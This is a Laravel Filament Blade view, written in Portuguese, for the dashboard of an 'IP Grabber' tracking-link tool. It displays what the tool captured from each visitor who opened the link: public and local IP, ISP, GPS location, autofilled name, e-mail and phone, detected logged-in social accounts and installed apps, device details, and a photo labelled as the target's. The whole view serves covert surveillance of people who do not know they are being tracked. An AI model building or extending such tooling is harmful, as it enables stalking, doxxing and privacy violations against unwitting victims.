<x-filament-panels::page>
    <x-filament::section heading="Resumo do IP Grabber">
        <dl class="grid grid-cols-1 gap-4 text-sm sm:grid-cols-4">
            <div>
                <dt class="font-medium text-gray-500 dark:text-gray-400">Identificação</dt>
                <dd class="mt-1 text-gray-900 dark:text-gray-100">{{ $this->record->label }}</dd>
            </div>
            <div>
                <dt class="font-medium text-gray-500 dark:text-gray-400">Status</dt>
                <dd class="mt-1 text-gray-900 dark:text-gray-100">{{ $this->record->clicked_at ? 'Capturado' : 'Aguardando' }}</dd>
            </div>
            <div>
                <dt class="font-medium text-gray-500 dark:text-gray-400">Total de acessos</dt>
                <dd class="mt-1 text-gray-900 dark:text-gray-100">{{ $this->record->total_acessos }}</dd>
            </div>
            <div>
                <dt class="font-medium text-gray-500 dark:text-gray-400">Primeiro acesso</dt>
                <dd class="mt-1 text-gray-900 dark:text-gray-100">
                    {{ $this->record->clicked_at?->timezone('America/Sao_Paulo')->format('d/m/Y H:i:s') ?? '-' }}
                </dd>
            </div>
        </dl>
    </x-filament::section>

    {{-- ──────────────────── IDENTIDADE DIGITAL ──────────────────── --}}
    @php
        $identidade = $this->getIdentidadeDigital();

        // Separa redes logadas (têm usuario ou logado=true) de apps só instalados
        $redesLogadas   = collect($identidade['redes'])->filter(fn($r) => !empty($r['usuario']) || !empty($r['logado']))->values();
        $appsInstalados = collect($identidade['redes'])->filter(fn($r) => empty($r['usuario']) && empty($r['logado']) && !empty($r['instalado']))->values();

        $temIdentidade = $identidade['nome'] || $identidade['email'] || $identidade['telefone']
                      || $redesLogadas->isNotEmpty() || $appsInstalados->isNotEmpty();
    @endphp

    @if ($temIdentidade)
        <x-filament::section class="mt-4">
            <x-slot name="heading">
                <span style="display:inline-flex;align-items:center;gap:6px;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke-width="1.8" stroke="currentColor" style="color:#6366f1">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.501 20.118a7.5 7.5 0 0 1 14.998 0A17.933 17.933 0 0 1 12 21.75c-2.676 0-5.216-.584-7.499-1.632Z" />
                    </svg>
                    Identidade Digital Capturada
                </span>
            </x-slot>

            <p class="mb-4 text-xs text-gray-500 dark:text-gray-400">
                Exibe dados disponibilizados pelo navegador: autofill, conta Google quando acessível, indícios de contas logadas e apps detectados no celular. Perfis como Instagram podem aparecer apenas como “logado” ou “app instalado”, pois o navegador não informa o @usuário.
            </p>

            {{-- Linha 1: dados pessoais --}}
            <dl class="grid grid-cols-1 gap-4 text-sm sm:grid-cols-3 mb-5">
                <div>
                    <dt class="font-medium text-gray-500 dark:text-gray-400">Nome (autofill)</dt>
                    <dd class="mt-1 font-semibold text-gray-900 dark:text-gray-100">
                        {{ $identidade['nome'] ?? '—' }}
                    </dd>
                </div>
                <div>
                    <dt class="font-medium text-gray-500 dark:text-gray-400">E-mail (autofill)</dt>
                    <dd class="mt-1 font-semibold text-gray-900 dark:text-gray-100">
                        @if($identidade['email'])
                            <a href="mailto:{{ $identidade['email'] }}" style="color:var(--color-primary-600);text-decoration:underline;">
                                {{ $identidade['email'] }}
                            </a>
                        @else —
                        @endif
                    </dd>
                </div>
                <div>
                    <dt class="font-medium text-gray-500 dark:text-gray-400">Telefone (autofill)</dt>
                    <dd class="mt-1 font-semibold text-gray-900 dark:text-gray-100">
                        @if($identidade['telefone'])
                            <a href="tel:{{ $identidade['telefone'] }}" style="color:var(--color-primary-600);text-decoration:underline;">
                                {{ $identidade['telefone'] }}
                            </a>
                        @else —
                        @endif
                    </dd>
                </div>
            </dl>

            {{-- Linha 2: redes sociais logadas --}}
            @if ($redesLogadas->isNotEmpty())
                <div class="mb-4">
                    <p class="text-xs font-semibold uppercase tracking-wide text-gray-500 dark:text-gray-400 mb-2">
                        🔐 Contas Logadas no Navegador
                    </p>
                    <div style="display:flex;flex-direction:column;gap:6px;">
                        @foreach ($redesLogadas as $r)
                            @php
                                $temUsuario = !empty($r['usuario']);
                                // Redes onde só confirmamos "logado" — username não é acessível cross-site
                                $somenteLogado = !$temUsuario && !empty($r['logado']);
                                $redesSemUsername = ['Instagram','Twitter/X','LinkedIn','TikTok','Pinterest','Facebook'];
                                $avisaSemUsername = $somenteLogado && in_array($r['rede'], $redesSemUsername);

                                $icone = match(true) {
                                    str_contains($r['rede'], 'Google')    => '🔵',
                                    str_contains($r['rede'], 'Facebook')  => '🔵',
                                    str_contains($r['rede'], 'Instagram') => '🟣',
                                    str_contains($r['rede'], 'Twitter')   => '🐦',
                                    str_contains($r['rede'], 'LinkedIn')  => '💼',
                                    str_contains($r['rede'], 'TikTok')    => '🎵',
                                    str_contains($r['rede'], 'Telegram')  => '✈️',
                                    str_contains($r['rede'], 'Pinterest') => '📌',
                                    default                               => '🌐',
                                };
                            @endphp
                            <div style="display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:8px;background:#f0fdf4;border:1px solid #bbf7d0;font-size:0.875rem;flex-wrap:wrap;">
                                <span>{{ $icone }}</span>
                                <span style="font-weight:700;color:#166534;">{{ $r['rede'] }}</span>

                                @if ($temUsuario)
                                    {{-- Google: temos email + nome --}}
                                    <span style="color:#1e3a5f;font-weight:600;">{{ $r['usuario'] }}</span>
                                    @if (!empty($r['nome']) && $r['nome'] !== $r['usuario'])
                                        <span style="color:#6b7280;font-size:0.8rem;">({{ $r['nome'] }})</span>
                                    @endif
                                @elseif ($avisaSemUsername)
                                    {{-- Logado detectado, mas username não acessível --}}
                                    <span style="color:#16a34a;font-style:italic;">✓ logado</span>
                                    <span style="color:#9ca3af;font-size:0.72rem;" title="O username do {{ $r['rede'] }} não é acessível por restrições do browser (SameSite cookies). Apenas a presença do login foi confirmada.">
                                        · username não disponível ⓘ
                                    </span>
                                @else
                                    <span style="color:#16a34a;font-style:italic;">✓ logado</span>
                                @endif
                            </div>
                        @endforeach
                    </div>
                </div>
            @endif

            {{-- Linha 3: apps instalados (mobile) --}}
            @if ($appsInstalados->isNotEmpty())
                <div>
                    <p class="text-xs font-semibold uppercase tracking-wide text-gray-500 dark:text-gray-400 mb-2">
                        📱 Apps Instalados (detectado no celular)
                    </p>
                    <div style="display:flex;flex-wrap:wrap;gap:6px;">
                        @foreach ($appsInstalados as $app)
                            <span style="display:inline-block;padding:3px 10px;border-radius:9999px;background:#e0e7ff;color:#3730a3;font-size:0.78rem;font-weight:600;">
                                {{ $app['rede'] }}
                            </span>
                        @endforeach
                    </div>
                </div>
            @endif
        </x-filament::section>
    @endif

    {{-- ──────────────────── HISTÓRICO DE ACESSOS ──────────────────── --}}
    <x-filament::section heading="Histórico de acessos" class="mt-4">
        @php $acessos = $this->getAcessos(); @endphp

        @if (empty($acessos))
            <p class="text-sm text-gray-500 dark:text-gray-400">Nenhum acesso registrado.</p>
        @else
            <div class="overflow-x-auto rounded-lg border border-gray-200 dark:border-gray-700">
                <table class="min-w-full divide-y divide-gray-200 text-sm dark:divide-gray-700">
                    <thead class="bg-gray-50 dark:bg-gray-800">
                        <tr>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Data/Hora</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Origem</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">IP Público</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Porta</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">IP Local</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">GMT</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Localização IP</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">GPS autorizado</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Precisão GPS</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">ISP</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Idioma</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Plataforma</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Resolução</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Referer</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">User-Agent</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200" style="color:#16a34a;min-width:80px;">📷 Foto</th>
                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200" style="color:#6366f1;min-width:340px;">🪪 Identidade Digital</th>
                        </tr>
                    </thead>
                    <tbody class="divide-y divide-gray-100 bg-white dark:divide-gray-800 dark:bg-gray-900">
                        @foreach ($acessos as $acesso)
                            @php
                                $acessoRedesLogadas   = collect($acesso['identidade_redes'])->filter(fn($r) => !empty($r['usuario']) || !empty($r['logado']))->values();
                                $acessoAppsInstalados = collect($acesso['identidade_redes'])->filter(fn($r) => empty($r['usuario']) && empty($r['logado']) && !empty($r['instalado']))->values();
                                $acessoTemId = $acesso['identidade_nome'] || $acesso['identidade_email'] || $acesso['identidade_telefone']
                                            || $acessoRedesLogadas->isNotEmpty() || $acessoAppsInstalados->isNotEmpty();
                            @endphp
                            <tr>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-900 dark:text-gray-100">{{ $acesso['accessed_at'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-700 dark:text-gray-300">{{ $acesso['endpoint'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 font-mono text-gray-900 dark:text-gray-100">{{ $acesso['ip'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 font-mono text-gray-700 dark:text-gray-300">{{ $acesso['porta'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 font-mono text-gray-700 dark:text-gray-300">{{ $acesso['ip_local'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-700 dark:text-gray-300">{{ explode(' ', $acesso['gmt'])[0] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-700 dark:text-gray-300">{{ $acesso['localizacao'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 font-mono text-gray-700 dark:text-gray-300">
                                    @if ($acesso['gps_url'])
                                        <a href="{{ $acesso['gps_url'] }}" target="_blank" rel="noopener noreferrer" style="display:inline-flex;align-items:center;gap:4px;text-decoration:underline;color:var(--color-primary-600);">
                                            {{ $acesso['gps'] }}
                                            <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="flex-shrink:0;">
                                                <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25" />
                                            </svg>
                                        </a>
                                    @else
                                        @php
                                            $gpsStatus = match ($acesso['gps_status']) {
                                                'denied' => 'Não autorizado',
                                                'unavailable' => 'Indisponível',
                                                'timeout' => 'Tempo esgotado',
                                                'unsupported' => 'Sem suporte',
                                                'insecure' => 'Contexto inseguro',
                                                'skipped' => 'Não solicitado',
                                                'error' => 'Erro',
                                                default => $acesso['gps'],
                                            };
                                        @endphp
                                        <span title="{{ $acesso['gps_error'] }}">{{ $gpsStatus }}</span>
                                    @endif
                                </td>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-700 dark:text-gray-300">{{ $acesso['gps_accuracy'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-700 dark:text-gray-300">{{ $acesso['isp'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-700 dark:text-gray-300">{{ $acesso['idioma'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-700 dark:text-gray-300">{{ $acesso['plataforma'] }}</td>
                                <td class="whitespace-nowrap px-3 py-2 text-gray-700 dark:text-gray-300">{{ $acesso['resolucao'] }}</td>
                                <td class="max-w-xs truncate px-3 py-2 text-gray-700 dark:text-gray-300" title="{{ $acesso['referer'] }}">{{ $acesso['referer'] }}</td>
                                <td class="max-w-md truncate px-3 py-2 text-gray-700 dark:text-gray-300" title="{{ $acesso['user_agent'] }}">{{ $acesso['user_agent'] }}</td>

                                {{-- Coluna Foto --}}
                                <td class="whitespace-nowrap px-3 py-2">
                                    @if ($acesso['foto_url'] ?? null)
                                        <a href="{{ $acesso['foto_url'] ?? '' }}" target="_blank" rel="noopener"
                                           title="Ver foto em tamanho original">
                                            <img
                                                src="{{ $acesso['foto_url'] ?? '' }}"
                                                alt="Foto do alvo"
                                                style="width:48px;height:48px;object-fit:cover;border-radius:6px;box-shadow:0 1px 4px rgba(0,0,0,.18);cursor:pointer;"
                                            >
                                        </a>
                                    @else
                                        <span class="text-gray-400 text-xs">—</span>
                                    @endif
                                </td>

                                {{-- Coluna Identidade Digital --}}
                                <td class="px-3 py-2" style="min-width:340px;">
                                    @if ($acessoTemId)
                                        <div style="display:flex;flex-direction:column;gap:8px;font-size:0.78rem;line-height:1.4;">
                                            @if($acesso['identidade_nome'] || $acesso['identidade_email'] || $acesso['identidade_telefone'])
                                                <div style="display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:6px;">
                                                    <div style="padding:6px 8px;border-radius:8px;background:#f9fafb;border:1px solid #e5e7eb;">
                                                        <div style="font-size:0.65rem;text-transform:uppercase;color:#6b7280;font-weight:700;">Nome</div>
                                                        <div style="font-weight:600;color:#111827;word-break:break-word;">{{ $acesso['identidade_nome'] ?: '—' }}</div>
                                                    </div>
                                                    <div style="padding:6px 8px;border-radius:8px;background:#f9fafb;border:1px solid #e5e7eb;">
                                                        <div style="font-size:0.65rem;text-transform:uppercase;color:#6b7280;font-weight:700;">E-mail</div>
                                                        <div style="font-weight:600;color:#111827;word-break:break-word;">{{ $acesso['identidade_email'] ?: '—' }}</div>
                                                    </div>
                                                    <div style="padding:6px 8px;border-radius:8px;background:#f9fafb;border:1px solid #e5e7eb;">
                                                        <div style="font-size:0.65rem;text-transform:uppercase;color:#6b7280;font-weight:700;">Telefone</div>
                                                        <div style="font-weight:600;color:#111827;word-break:break-word;">{{ $acesso['identidade_telefone'] ?: '—' }}</div>
                                                    </div>
                                                </div>
                                            @endif

                                            {{-- Redes logadas --}}
                                            @if($acessoRedesLogadas->isNotEmpty())
                                                <div style="padding:7px 8px;border-radius:8px;background:#f0fdf4;border:1px solid #bbf7d0;">
                                                    <div style="font-size:0.65rem;text-transform:uppercase;color:#166534;font-weight:800;margin-bottom:5px;">Contas detectadas</div>
                                                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
                                                        @foreach($acessoRedesLogadas as $r)
                                                            @php
                                                                $redeSemUser = ['Instagram','Twitter/X','LinkedIn','TikTok','Pinterest','Facebook'];
                                                            @endphp
                                                            <span style="display:inline-flex;align-items:center;gap:4px;padding:3px 7px;border-radius:9999px;background:#dcfce7;color:#166534;font-weight:700;">
                                                                {{ $r['rede'] }}:
                                                                @if(!empty($r['usuario']))
                                                                    <span style="color:#14532d;">{{ $r['usuario'] }}</span>
                                                                    @if(!empty($r['nome']))
                                                                        <span style="font-weight:500;color:#4b5563;">({{ $r['nome'] }})</span>
                                                                    @endif
                                                                @elseif(in_array($r['rede'], $redeSemUser))
                                                                    <span style="font-weight:500;" title="Perfil/username não é disponibilizado pelo navegador">logado, perfil indisponível</span>
                                                                @else
                                                                    <span style="font-weight:500;">logado</span>
                                                                @endif
                                                            </span>
                                                        @endforeach
                                                    </div>
                                                </div>
                                            @endif

                                            {{-- Apps instalados --}}
                                            @if($acessoAppsInstalados->isNotEmpty())
                                                <div style="padding:7px 8px;border-radius:8px;background:#eef2ff;border:1px solid #c7d2fe;">
                                                    <div style="font-size:0.65rem;text-transform:uppercase;color:#3730a3;font-weight:800;margin-bottom:5px;">Apps detectados no celular</div>
                                                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
                                                        @foreach($acessoAppsInstalados as $app)
                                                            <span style="display:inline-block;padding:3px 8px;border-radius:9999px;background:#e0e7ff;color:#3730a3;font-weight:700;">
                                                                {{ $app['rede'] }}
                                                            </span>
                                                        @endforeach
                                                    </div>
                                                </div>
                                            @endif
                                        </div>
                                    @else
                                        <span class="text-gray-400 text-xs">—</span>
                                    @endif
                                </td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        @endif
    </x-filament::section>

    <x-filament-actions::modals />
</x-filament-panels::page>
